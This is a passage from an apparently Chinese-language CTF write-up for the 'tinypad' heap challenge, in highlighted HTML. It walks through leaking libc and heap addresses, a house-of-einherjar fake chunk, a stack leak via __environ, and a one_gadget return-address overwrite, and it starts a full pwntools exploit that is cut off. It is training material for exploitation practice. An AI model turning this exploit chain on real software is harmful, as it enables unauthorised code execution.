number\">1LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> tinypad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nEdited.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>分析完代码之后，想象一下如何泄露 libc_addr 和 heap_addr。可以挂一个 unsortedbin 和两个 fastbin 去写了</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(SIZE)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'D'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'E'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(Y/n)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Y'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>泄露 libc 和 heap</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>unsortedbin_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'unsortedbin_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc_base <span class=\"token operator\">=</span> unsortedbin_addr <span class=\"token operator\">-</span> <span class=\"token number\">88</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 2\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>heap_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>heap_base <span class=\"token operator\">=</span> heap_addr <span class=\"token operator\">-</span> <span class=\"token number\">0xe0</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来进行 <code>house-of-einherjar</code>  环节</p>\n<p>因为这个题的 Edi 写入的缘故，利用方法 1 还是比较难以操作，可以成方法 1 为三明治攻击</p>\n<p>所以我们利用 offset，去申请非 heap 区的区域，此题最合适的可以去利用 <code>tinypad</code> ，去伪造 chunk。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk3</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk4</span></pre></td></tr></table></figure><p>申请四个 chunk，利用前两个 chunk 进行 <code>house-of-einherjar</code>  流程</p>\n<p>由 Edi 的原因，在将 chunk2 的 p 位去置 0 需要进行循环写入操作</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>tinypad <span class=\"token operator\">=</span> <span class=\"token number\">0x602040</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>offset <span class=\"token operator\">=</span> heap_base <span class=\"token operator\">-</span> tinypad</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code class=\"language-ASN.1\">0x603000\t0x0000000000000000\t0x0000000000000021\t........!.......----&gt;chunk1\n0x603010\t0x6262626262626262\t0x6262626262626262\tbbbbbbbbbbbbbbbb\n0x603020\t0x0000000000000fc0\t0x0000000000000100\t................----&gt;chunk2\n0x603030\t0x6262626262626262\t0x6262626262626262\tbbbbbbbbbbbbbbbb\n</code></pre>\n<p>接下来我们去 free 掉 chunk，就可以通过 <code>chunk_addr - presize</code>  定位到下一个 free_chunk (fake_chunk)</p>\n<p>所以我们可以通过 Edi 操作，进行伪造 chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl1 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pl1<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code class=\"language-ASN.1\">0x602060 &lt;tinypad+32&gt;:\t0x0000000000000000\t0x0000000000000101----&gt;fake_chunk\n0x602070 &lt;tinypad+48&gt;:\t0x0000000000602060\t0x0000000000602060\n0x602080 &lt;tinypad+64&gt;:\t0x6262626262626200\t0x6262626262626262\n0x602090 &lt;tinypad+80&gt;:\t0x6262626262626262\t0x6262626262626262\n0x6020a0 &lt;tinypad+96&gt;:\t0x6262626262626262\t0x6262626262626262\n</code></pre>\n<p>接下来 free chunk2，绕过 unlink 检测</p>\n<blockquote>\n<p>Del(2)</p>\n<p>0x602060 &lt;tinypad+32&gt;:\t0x0000000000000000\t0x00000000000010c1<br>\n0x602070 &lt;tinypad+48&gt;:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78------&gt; 改成正常地址可分配<br>\n 0x602080 &lt;tinypad+64&gt;:\t0x0000000000000000\t0x0000000000000000</p>\n<p>pl2 = b’b’*0x20 + p64(0) + p64(0x101) + p64(tinypad+0x30) + p64(tinypad+0x30)<br>\nEdi(3,pl2)</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>env <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pl3 <span class=\"token operator\">=</span> <span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x602148</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>pl3<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 tinypad 去进行任意读写 chunk</p>\n<blockquote>\n<p>0x602140 &lt;tinypad+256&gt;:\t0x0000000000000018\t0x00007ffff7bc6f38 chunk1<br>\n0x602150 &lt;tinypad+272&gt;:\t0x00000000000000f0\t0x0000000000602148 chunk2<br>\n0x602160 &lt;tinypad+288&gt;:\t0x0000000000000100\t0x0000000000603131 chunk3<br>\n0x602170 &lt;tinypad+304&gt;:\t0x0000000000000100\t0x0000000000603240 chunk4</p>\n</blockquote>\n<p>chunk1 可以直接读 stack 地址，chunk2 可以指向 chunk1 位置，此时可以将 chunk1 当前的 env 改写成 ret 地址</p>\n<blockquote>\n<p>chunk2 结构</p>\n<p>0x602138 &lt;tinypad+248&gt;:\t0x6363636363636363\t0x0000000000000018<br>\n0x602148 &lt;tinypad+264&gt;:\t0x00007ffff7bc6f38\t0x00000000000000f0<br>\n0x602158 &lt;tinypad+280&gt;:\t0x0000000000602148\t0x0000000000000100<br>\n0x602168 &lt;tinypad+296&gt;:\t0x0000000000603131\t0x0000000000000100<br>\n0x602178 &lt;tinypad+312&gt;:\t0x0000000000603240\t0x0000000000000000</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>og <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>main_ret <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">30</span> <span class=\"token comment\"># main_ret_addr 固定偏移 8*30</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'Q'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp:</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">\"/home/yhuan/Desktop/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token 